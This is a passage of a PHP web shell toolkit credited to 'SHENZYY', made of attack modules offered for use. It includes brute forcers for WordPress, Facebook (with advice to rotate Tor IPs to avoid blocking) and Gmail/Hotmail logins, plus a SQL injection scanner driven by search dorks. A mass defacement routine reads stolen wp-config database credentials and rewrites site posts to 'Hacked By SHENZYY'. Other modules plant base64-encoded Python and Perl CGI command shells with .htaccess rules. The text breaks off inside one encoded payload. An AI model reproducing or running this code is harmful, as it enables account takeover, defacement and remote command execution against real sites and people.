$curl=curl_init(); 
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); 
curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php"); 
@curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt'); 
@curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt'); 
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4'); 
@curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); 
curl_setopt($curl,CURLOPT_TIMEOUT,20); 

$exec=curl_exec($curl); 
curl_close($curl); 
return $exec; 

} 

} 
}

elseif($_GET['do'] == 'wpbrute'){	
?>
                            <form action="?dir=<?php echo $pwd; ?>&amp;do=wpbrute" method="post">
                                <center>
                                    <br><Br><b>
                                        <font size='2'>+--=[ Wordpress Brute Force By SHENZYY ]=--+</font><br>
                                        <form enctype="multipart/form-data" method="POST">
                                            <table width='624' border='0' class='tabnet' id='Box'>
                                                <tr>
                                                    <th colspan="5">Wordpress Brute Force</th>
                                                </tr>
                                                
                                                
                                                <tr>
                                                    <td>&nbsp;</td>
                                                    <td>
                                                        <p>Hosts:</p>
                                                    </td>
                                                    <td>
                                                        <p> Users:</p>
                                                    </td>
                                                    <td>
                                                        <p>Passwords:</p>
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td>&nbsp;</td>
                                                    <td><textarea style="background:black;" name="hosts" cols="30" rows="10"><?php if($_POST){echo $_POST['hosts'];} ?></textarea></td>
                                                    <td><textarea style="background:black;" name="usernames" cols="30" rows="10"><?php if($_POST){echo $_POST['usernames'];}else {echo "admin";} ?></textarea></td>
                                                    <td><textarea style="background:black;" name="passwords" cols="30" rows="10"><?php if($_POST){echo $_POST['passwords'];}else {echo "admin\nadministrator\n123123\n123321\n123456\n1234567\n12345678\n123456789\n123456123456\nadmin2010\nadmin2011\npassword\nP@ssW0rd\n!@#$%^\n!@#$%^&*(\n(*&^%$#@!\n111111\n222222\n333333\n444444\n555555\n666666\n777777\n888888\n999999";} ?></textarea></td>
                                                </tr>
                                                <tr>
                                                    <td colspan="4"><input class='inputzbut' type="submit" name="submit" value="Brute Now" />
                                                        <?php
if($_POST)
{
	$hosts = trim(filter($_POST['hosts']));
	$passwords = trim(filter($_POST['passwords']));
	$usernames = trim(filter($_POST['usernames']));

	if($passwords && $usernames && $hosts)
	{
		$hosts_explode = explode("\n", $hosts);
		$usernames_explode = explode("\n", $usernames);
    	$passwords_explode = explode("\n", $passwords);

		foreach($hosts_explode as $host)
		{
			$host = RemoveLastSlash($host);
			$hacked = 0;
			$host = str_replace(array("http://","https://","www."),"",trim($host));
			$host = "http://".$host;
			$wpAdmin = $host.'/wp-admin/';

			if(!url_exists($host."/wp-login.php"))
			{echo "<p>".$host." => <font color='red'>Error In Login Page !</font></p>";ob_flush();flush();continue;}

			foreach($usernames_explode as $username)
			{
				foreach($passwords_explode as $password)
				{
					$ch   =     curl_init();
					curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
					curl_setopt($ch,CURLOPT_URL,$host.'/wp-login.php');
					curl_setopt($ch,CURLOPT_COOKIEJAR,"coki.txt");
					curl_setopt($ch,CURLOPT_COOKIEFILE,"coki.txt");
					curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
					curl_setopt($ch,CURLOPT_POST,TRUE);
					curl_setopt($ch,CURLOPT_POSTFIELDS,"log=".$username."&pwd=".$password."&wp-submit=Giri&#8207;"."&redirect_to=".$wpAdmin."&testcookie=1");
					$login    =	   curl_exec($ch);

					if(eregi ("profile.php",$login) )
					{
						$hacked = 1;
						echo "<p>".$host." => UserName : [<font color='white'>".$username."</font>] : Password : [<font color='white'>".$password."</font>]</p>";
						ob_flush();flush();break;
					}
				}
				if($hacked == 1){break;}
			}
			if($hacked == 0)
			{echo "<p>".$host." => <font color='red'>Failed !</font></p>";ob_flush();flush();}
		}
	}
	else {echo "<p><font color='red'>All fields are Required ! </font></p>";}
}
?>
                                                    </td>
                                                </tr>
                                            </table>
                                        </form>
                                </center>
                                <?php
function url_exists($strURL)
{
    $resURL = curl_init();
    curl_setopt($resURL, CURLOPT_URL, $strURL);
    curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
    curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
    curl_exec ($resURL);
    $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
    curl_close ($resURL);
    if ($intReturnCode != 200){return false;}
	else{return true ;}
}
function filter($string)
{
	if(get_magic_quotes_gpc() != 0){return stripslashes($string);	}
	else{return $string;	}
}
function RemoveLastSlash($host)
{
	if(strrpos($host, '/', -1) == strlen($host)-1)
	{return substr($host,0,strrpos($host, '/', -1));}
	else{return $host;}
}
echo "</p>";
}

elseif($_GET['do'] == 'fb'){

 @ini_set('output_buffering',0); 
?>
                                <form action="?dir=<?php echo $pwd; ?>dox=fb" method="post">
                                    <br><br>
                                    <center><b>
                                            <font size=4>+--=[ Facebook BruteForce by SHENZYY ]=--+</font>
                                        </b></center><br><br>
                                    <?php
ob_start();
@set_time_limit(0);
#################################################
#---------------------------------------------- #
# Facebook Brute Force 2018                     #
# Coded by : SHENZYY                        #
# Greetz : All LulzGhost Members                #
# WWW.lulzghost-team.site                       #
# --------------------------------------------- #
#################################################
 
echo "
<head>
<link rel='icon' type='image/ico' href='http://media.stateofq.com/photologue/photos/cache/facebook%20favicon_thumbnail.png'/>
<form method='POST'>
<title>Facebook Brute Force 2018</title>
</head>
<style>
textarea {
resize:none;
color: #1975FF ;
border:1px solid #1975FF ;
border-left: 4px solid #1975FF ;
}
input {
color: #1975FF;
border:1px dotted white;
}
</style>";
 
echo "
<body text='red'>
<center><img src='http://i.imgur.com/MiRrYCo.gif'></center>
<center>Gunakan ini dengan TOR BROWSER + TOR SWITCHER (ganti IP setiap 2 Menit Supaya Gak DIblok FB cok :v)</center>
<p dir='ltr' align='center'>
<textarea name='username' cols='42' rows='14'>Username Target Lu Cok</textarea>
<textarea name='password' cols='42' rows='14'>Wordlist Password Target Lu Cok</textarea><br>
<br>
<input type='submit' name='scan' value='Start BruteForce'><br></p>";
if(isset($_POST['scan'])){
#To Put Proxy SOCKS V5
//curl_setopt($ch, CURLOPT_PROXY, "proxy:port");          
//curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
function brute($user,$pass){
$ch = curl_init();      
curl_setopt($ch, CURLOPT_URL, "https://m.facebook.com/login.php?login_attempt=1");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, "email={$user}&pass={$pass}");
curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
$login = curl_exec($ch);
//print_r($login);
$check = (eregi('class="s t i u"',$login)) ? true:false;
if($check == true){
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>Not the right one :(  || Username : <font color='red'>$user</font>&nbsp;  Password : <font color='red'>$pass</font></font></p>";
}else{
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>This Password Seems Working !Try It ^_^ by SHENZYY|| Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
}
}            
 
 
 
$username = explode("\n", $_POST['username']);
$password = explode("\n", $_POST['password']);
foreach($username as $users) {
$users = @trim($users);
foreach($password as $pass) {
$pass = @trim($pass);
echo brute($users,$pass);
}
 
}
 
}
echo"<br>
<br>
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Published by : SHENZYY<br><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by : SHENZYY</font></b></p></center>";
}

elseif($_GET['do'] == 'emailbrute'){ 
	@ini_set('output_buffering',0); 
?>
                                    <form action="?y=<?php echo $pwd; ?>&x=syahrul" method="post">
                                        <br><br>
                                        <center><b>
                                                <font size=4>+--=[ Gmail BruteForce by SHENZYY ]=--+</font>
                                            </b></center><br>
                                        <center><span style="font-size:30px; font-family:Fredericka the Great; color:#1975FF">Gmail & Hotmail BruteForce SHENZYY</span>
                                            <center><br>
                                                <?php
   set_time_limit(0); 
error_reporting(0); 
         
class s1{ 
         
private $adres = array( 
'gmail' => '{imap.gmail.com:993/imap/ssl}', 
'hotmail' => '{pop3.live.com:995/pop3/ssl}' 
); 
private $imap;         
function __construct($gelen1,$gelen2){ 
                 
$uname     = explode("\r\n",$gelen1);     
$pwd     = explode("\r\n",$gelen2);     
foreach($pwd as $pass){ 
$pass = trim($pass); 
foreach($uname as $user){ 
$user = trim($user); 
                                 
if(preg_match('@gmail@si',$user)){ 
$this->baglan($this->adres["gmail"],$user,$pass); 
}else{ 
$this->baglan($this->adres["hotmail"],$user,$pass); 
} 
} 
} 
}     
                 
public function baglan($url,$user,$pass){ 
                 
$this->imap = imap_open($url,$user,$pass); 
if($this->imap){ 
echo "<span id='cikti' >$user => $pass </span><br 

/>"; 
} 
} 
function __destruct(){ 
             
imap_close($this->imap); 
             
} 
} 
         
echo "
<head>
<link rel='icon' type='image/ico' href='http://www.hondupalmahn.com/imagenes/gmail.png'/>
<form method='POST'>
<title>Gmail Brute Force 2018</title>
</head>
<style>
textarea {
resize:none;
color: #1975FF ;
border:1px solid #1975FF ;
border-left: 4px solid #1975FF ;
}
input {
color: #1975FF;
border:1px dotted #33CCFF;
}
</style>";

		 echo '<br /> <center><div id="form"> 
<form id="form" method="POST" > 
<textarea cols="42" class="area" name="mail" rows="14" 

cols="28">Email Target Lu Disini Cok ^_^</textarea>  
<textarea cols="42" class="area" name="sifre" rows="14" 

cols="28">Password List Lu Disini Cok ^_^</textarea> <br /> <br />
<input type="submit" id="submit" value="Brute !" /> 
</form><br> 
</div> 
<div id="sonuc"> ';
        
         
if($_POST){ 
$mails = $_POST["mail"]; 
$sifre = $_POST["sifre"]; 
             
if((isset($mails)) and (isset($sifre))){     
$s1 = new s1($mails,$sifre); 
} 
} 
         
echo '</center></div> ';
}

elseif($_GET['do'] == 'sqli-scanner')
{	
?>
                                                <form action="?dir=<?php echo $pwd; ?>&amp;=sqli-scanner" method="post">
                                                    
                                                    <?php

echo '<br><br><center><form method="post" action=""><b><font color="white">Dork : </font></b> &nbsp;&nbsp;<input class="inputz" type="text" value="" name="dork" style="color:white;background-color:#000000" size="20"/>&nbsp;<input class="inputzbut" type="submit" style="color:white;background-color:#000000" name="scan" value="Scan"></form></center>';

ob_start();
set_time_limit(0);

if (isset($_POST['scan'])) {

$browser = $_SERVER['HTTP_USER_AGENT'];

$first = "startgoogle.startpagina.nl/index.php?q=";
$sec = "&start=";
$reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';

for($id=0 ; $id<=30; $id++){
$page=$id*10;
$dork=urlencode($_POST['dork']);
$url = $first.$dork.$sec.$page;

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
$result = curl_exec($curl);
curl_close($curl);

preg_match_all($reg,$result,$matches);
}
foreach($matches[1] as $site){

$url = preg_replace("/=/", "='", $site);
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
curl_setopt($curl,CURLOPT_TIMEOUT,'5');
$GET=curl_exec($curl); 
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * 

FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET)) { 
echo '<center><b><font color="#E10000">Found : </font><a href="'.$url.'" target="_blank">'.$url.'</a><font color=#FF0000> &#60;-- SQLI Vuln 

Found..</font></b></center>';
ob_flush();flush(); 
}else{ 
echo '<center><font color="#FFFFFF"><b>'.$url.'</b></font><font color="#0FFF16"> &#60;-- Not Vuln</font></center>';
ob_flush();flush(); 
}
ob_flush();flush();
}
ob_flush();flush();
}
ob_flush();flush();
}

elseif($_GET['do'] == 'phpinfo'){ 
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
}

elseif($_GET['do'] == 'title'){
echo "<center><h1>Mass Title Changer</h1>
<form method='post'>
Link Config: <br>
<input type='text' name='linkconf' height='10' style='width: 450px;' placeholder='http://xnxx.com/ia_symconf/'><br>
<input type='submit' style='width: 450px;' name='gass' value='Hajar!!' class='oke'>
</form></center>";
if($_POST['gass']) {
    echo "<center>
<form method='post'>
Link Config: <br>
<textarea name='link'>";
GrabUrl($_POST['linkconf'],'wordpress');   
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By SHENZYY'><br>POST CONTENT: <input type='text' name='content' value='Hacked By SHENZYY'><br>POSTNAME: <input type='text' name='postname' value='HackeD By SHENZYY'><br>
<input type='submit' style='width: 450px;' name='edittitle' value='Gassbre!!'>
</form></center>";
}
if($_POST['edittitle']) {
            $title = htmlspecialchars($_POST['title']);
                $id = $_POST['id'];
                $content = $_POST['content'];
                $postname = $_POST['name'];
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        foreach($link as $dir_config) {
                                $config = anucurl($dir_config);
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$content',post_name='$postname',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=lime>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }
}
	

	elseif($_GET['do'] == 'cgipy') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgipy.SHENZYY";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_SHENZYY \n AddHandler cgi-script .Index_SHENZYY \n AddHandler cgi-script .Index_SHENZYY";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9weXRob24NCiMgMDctMDctMDQNCiMgdjEuMC4wDQoNCiMgY2dpLXNoZWxsLnB5DQojIEEgc2ltcGxlIENHSSB0aGF0IGV4ZWN1dGVzIGFyYml0cmFyeSBzaGVsbCBjb21tYW5kcy4NCg0KDQojIENvcHlyaWdodCBNaWNoYWVsIEZvb3JkDQojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQgcmVsaWNlbnNlIHRoaXMgY29kZS4NCg0KIyBObyB3YXJyYW50eSBleHByZXNzIG9yIGltcGxpZWQgZm9yIHRoZSBhY2N1cmFjeSwgZml0bmVzcyB0byBwdXJwb3NlIG9yIG90aGVyd2lzZSBmb3IgdGhpcyBjb2RlLi4uLg0KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISENCg0KIyBFLW1haWwgbWljaGFlbCBBVCBmb29yZCBET1QgbWUgRE9UIHVrDQojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsvYXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbA0KDQoiIiINCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8gZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLg0KIiIiDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIEltcG9ydHMNCnRyeToNCiAgICBpbXBvcnQgY2dpdGI7IGNnaXRiLmVuYWJsZSgpDQpleGNlcHQ6DQogICAgcGFzcw0KaW1wb3J0IHN5cywgY2dpLCBvcw0Kc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQNCmZyb20gdGltZSBpbXBvcnQgc3RyZnRpbWUNCmltcG9ydCB0cmFjZWJhY2sNCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPDQpmcm9tIHRyYWNlYmFjayBpbXBvcnQgcHJpbnRfZXhjDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgY29uc3RhbnRzDQoNCmZvbnRsaW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQtc2l6ZToxMnB0OyI+Jw0KdmVyc2lvbnN0cmluZyA9ICdWZXJzaW9uIDEuMC4wIDd0aCBKdWx5IDIwMDQnDQoNCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToNCiAgICBzY3JpcHRuYW1lID0gb3MuZW52aXJvblsiU0NSSVBUX05BTUUiXQ0KZWxzZToNCiAgICBzY3JpcHRuYW1lID0gIiINCg0KTUVUSE9EID0gJyJQT1NUIicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBQcml2YXRlIGZ1bmN0aW9ucyBhbmQgdmFyaWFibGVzDQoNCmRlZiBnZXRmb3JtKHZhbHVlbGlzdCwgdGhlZm9ybSwgbm90cHJlc2VudD0nJyk6DQogICAgIiIiVGhpcyBmdW5jdGlvbiwgZ2l2ZW4gYSBDR0kgZm9ybSwgZXh0cmFjdHMgdGhlIGRhdGEgZnJvbSBpdCwgYmFzZWQgb24NCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFsdWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLg0KICAgIChlLmcuIHRvIHJldHVybiBOb25lIHNvIHlvdSBjYW4gdGVzdCBmb3IgbWlzc2luZyBrZXl3b3JkcyAtIHdoZXJlICcnIGlzIGEgdmFsaWQgYW5zd2VyIGJ1dCB0byBoYXZlIHRoZSBmaWVsZCBtaXNzaW5nIGlzbid0LikiIiINCiAgICBkYXRhID0ge30NCiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0Og0KICAgICAgICBpZiBub3QgdGhlZm9ybS5oYXNfa2V5KGZpZWxkKToNCiAgICAgICAgICAgIGRhdGFbZmllbGRdID0gbm90cHJlc2VudA0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgaWYgIHR5cGUodGhlZm9ybVtmaWVsZF0pICE9IHR5cGUoW10pOg0KICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdGhlZm9ybVtmaWVsZF0udmFsdWUNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgdmFsdWVzID0gbWFwKGxhbWJkYSB4OiB4LnZhbHVlLCB0aGVmb3JtW2ZpZWxkXSkgICAgICMgYWxsb3dzIGZvciBsaXN0IHR5cGUgdmFsdWVzDQogICAgICAgICAgICAgICAgZGF0YVtmaWVsZF0gPSB2YWx1ZXMNCiAgICByZXR1cm4gZGF0YQ0KDQoNCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1zaGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+DQo8Qk9EWT48Q0VOVEVSPg0KPEgxPldlbGNvbWUgdG8gY2dpLXNoZWxsLnB5IC0gPEJSPmEgUHl0aG9uIENHSTwvSDE+DQo8Qj48ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPg0KIiIiK2ZvbnRsaW5lICsiVmVyc2lvbiA6ICIgKyB2ZXJzaW9uc3RyaW5nICsgIiIiLCBSdW5uaW5nIG9uIDogIiIiICsgc3RyZnRpbWUoJyVJOiVNICVwLCAlQSAlZCAlQiwgJVknKSsnLjwvQ0VOVEVSPjxCUj4nDQoNCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIgQ29tbWFuZDwvSDI+DQo8Rk9STSBNRVRIT0Q9XCIiIiIgKyBNRVRIT0QgKyAnIiBhY3Rpb249IicgKyBzY3JpcHRuYW1lICsgIiIiXCI+DQo8aW5wdXQgbmFtZT1jbWQgdHlwZT10ZXh0PjxCUj4NCjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+DQo8L0ZPUk0+PEJSPjxCUj4iIiINCmJvZHllbmQgPSAnPC9CT0RZPjwvSFRNTD4nDQplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5nIFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBtYWluIGJvZHkgb2YgdGhlIHNjcmlwdA0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIHByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyDQogICAgcHJpbnQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgc28gaXMgdGhpcyBibGFuayBsaW5lDQogICAgZm9ybSA9IGNnaS5GaWVsZFN0b3JhZ2UoKQ0KICAgIGRhdGEgPSBnZXRmb3JtKFsnY21kJ10sZm9ybSkNCiAgICB0aGVjbWQgPSBkYXRhWydjbWQnXQ0KICAgIHByaW50IHRoZWZvcm1oZWFkDQogICAgcHJpbnQgdGhlZm9ybQ0KICAgIGlmIHRoZWNtZDoNCiAgICAgICAgcHJpbnQgJzxIUj48QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJ1Jlc3VsdCA6IDxCUj48QlI+Jw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZGluLmNsb3NlKCkNCiAgICAgICAgICAgIHJlc3VsdCA9IGNoaWxkX3N0ZG91dC5yZWFkKCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpDQogICAgICAgICAgICBwcmludCByZXN1bHQucmVwbGFjZSgnXG4nLCAnPEJSPicpDQoNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNvbW1hbmQNCiAgICAgICAgICAgIHByaW50IGVycm9ybWVzcw0KICAgICAgICAgICAgZiA9IFN0cmluZ0lPKCkNCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpDQogICAgICAgICAgICBhID0gZi5nZXR2YWx1ZSgpLnNwbGl0bGluZXMoKQ0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gYToNCiAgICAgICAgICAgICAgICBwcmludCBsaW5lDQoNCiAgICBwcmludCBib2R5ZW5kDQoNCg0KIiIiDQpUT0RPL0lTU1VFUw0KDQoNCg0KQ0hBTkdFTE9HDQoNCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wDQpBIHZlcnkgYmFzaWMgc3lzdGVtIGZvciBleGVjdXRpbmcgc2hlbGwgY29tbWFuZHMuDQpJIG1heSBleHBhbmQgaXQgaW50byBhIHByb3BlciAnZW52aXJvbm1lbnQnIHdpdGggc2Vzc2lvbiBwZXJzaXN0ZW5jZS4uLg0KIiIi";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgipy.SHENZYY' target='_blank'>Klik Here</a>";
}
	

elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgi.SHENZYY";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .SHENZYY \n AddHandler cgi-script .SHENZYY \n AddHandler cgi-script .SHENZYY";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS4zIjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7DQoNCiRQYXNzd29yZCA9ICJ4YWlzeW5kaWNhdGUiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcyB0byBsb2dpbi4NCnN1YiBJc19XaW4oKXsNCgkkb3MgPSAmdHJpbSgkRU5WeyJTRVJWRVJfU09GVFdBUkUifSk7DQoJaWYoJG9zID1+IG0vd2luL2kpew0KCQlyZXR1cm4gMTsNCgl9DQoJZWxzZXsNCgkJcmV0dXJuIDA7DQoJfQ0KfQ0KJFdpbk5UID0gJklzX1dpbigpOwkJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91DQoJCQkJCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFdpbmRvd3MgTlQuDQoNCiRVbml4Q21kU2VwID0gIjsiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTAwMDA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoJCQkJCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzDQoJCQkJCQkJCSMgdXNlZnVsIGZvciBjb21tYW5kcy